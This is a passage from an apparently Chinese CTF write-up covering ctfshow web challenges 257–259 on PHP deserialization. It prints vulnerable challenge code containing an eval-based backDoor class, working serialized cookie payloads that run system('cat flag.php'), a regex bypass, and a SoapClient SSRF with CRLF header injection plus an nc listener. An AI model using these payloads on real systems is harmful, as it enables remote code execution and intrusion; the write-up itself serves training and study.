data-num=\"43\"></td><td><pre>Cookie:user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A1%3A%22a%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A1%3A%22b%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A21%3A%22eval%28%24_POST%5BK1nako%5D%29%3B%22%3B%7D%7D</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Post:K1nako=system('cat flag.php');</pre></td></tr></table></figure><pre><code>ctfshow&#123;4de449fd-d8f2-4674-9405-c758daa4d43f&#125;\n</code></pre>\n<h2 id=\"web258\"><a class=\"anchor\" href=\"#web258\">#</a> web258</h2>\n<p>开始反序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-02 21:38:56</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'info'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">-></span><span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">info</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[oc]:\\d+:/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>对O:进行了过滤</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'backDoor'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">backDoor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">-></span><span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system('cat flag.php');\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$str1</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'O:'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'O:+'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 绕过 preg_match</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">// echo $str;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload:</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>?username=a&amp;password=b</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>Cookie:user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</pre></td></tr></table></figure><pre><code>ctfshow&#123;fcb320c5-47bc-4aed-8d8f-c38b8cc849f5&#125;\n</code></pre>\n<h2 id=\"web259\"><a class=\"anchor\" href=\"#web259\">#</a> web259</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$vip</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'vip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//vip can get flag one key</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$vip</span><span class=\"token operator\">-></span><span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag<span class=\"token operator\">.</span><span class=\"token class-name type-declaration\">php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$xff</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.txt'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>题目考察php原生类的反序列化</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>要想得到flag，必须本地访问flag.php而且带上token，一看到是根据x-forwarded-for来判断的，因此这题需要利用原生类的反序列化来实现SSRF，考察的是php的SoapClient原生类的反序列化。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>需要用到php扩展soap和natcat</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>首先构造监听9999端口查看头</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$client</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token operator\">.</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://127.0.0.1:9999/'</span><span class=\"token punctuation\">,</span>location<span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://127.0.0.1:9999/flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$client</span> <span class=\"token operator\">=></span><span class=\"token function\">getflag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>nc -lvp 9999</pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>监听成功后，按照监听后的格式修改内容添加表单格式</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//token=ctfshow</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$ua</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"K1nako\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$client</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://127.0.0.1:9999/'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'location'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://127.0.0.1:9999/flag.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=></span><span class=\"token variable\">$ua</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$client</span><span class=\"token operator\">-></span><span class=\"token function\">getflag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>//监听内容</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>POST /flag.php HTTP/1.1</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Host: 127.0.0.1:9999</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Connection: Keep-Alive</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>User-Agent: K1nako</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Content-Type:application/x-www-form-urlencoded</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Content-Length:13\t//长度为13：token=ctfshow，限制长度过滤剩下没用的内容</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>token=ctfshow</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Content-Type: text/xml; charset=utf-8</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>SOAPAction: \"http://127.0.0.1:9999/#getflag\"</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Content-Length: 389</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span> encoding<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"UTF-8\"</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">SOAP-ENV:</span>Envelope</span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>SOAP-ENV</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://schemas.xmlsoap.org/soap/envelope/<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>ns1</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://127.0.0.1:9999/<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xsd</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XMLSchema<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>SOAP-ENC</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://schemas.xmlsoap.org/soap/encoding/<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">SOAP-ENV:</span>encodingStyle</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://schemas.xmlsoap.org/soap/encoding/<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">SOAP-ENV:</span>Body</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token 